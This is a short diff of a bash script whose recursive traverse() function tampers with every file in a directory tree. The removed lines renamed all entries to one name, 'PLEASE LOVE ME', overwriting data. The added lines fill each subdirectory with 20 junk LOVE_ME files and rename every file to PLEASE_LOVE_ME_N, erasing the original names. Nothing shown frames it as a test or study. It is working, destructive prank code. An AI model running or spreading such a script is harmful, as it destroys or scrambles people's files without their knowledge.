@@ -42,13 +42,19 @@ traverse() {
 
         if [ -d "$entry" ]; then
             traverse "$entry" $((depth + 1))
-            mv "$entry" "PLEASE LOVE ME"
+            
+            for i in {1..20}; do 
+                touch "$entry/LOVE_ME_${i}"
+            done
+
         fi
     done
 
+    count=50
     for file in "$dir"/*; do
         [ -f "$file" ] || continue
-        mv "$file" "PLEASE LOVE ME"
+        mv "$file" "$(dirname "$file")/PLEASE_LOVE_ME_${count}"
+        ((count++))
     done
 }
 
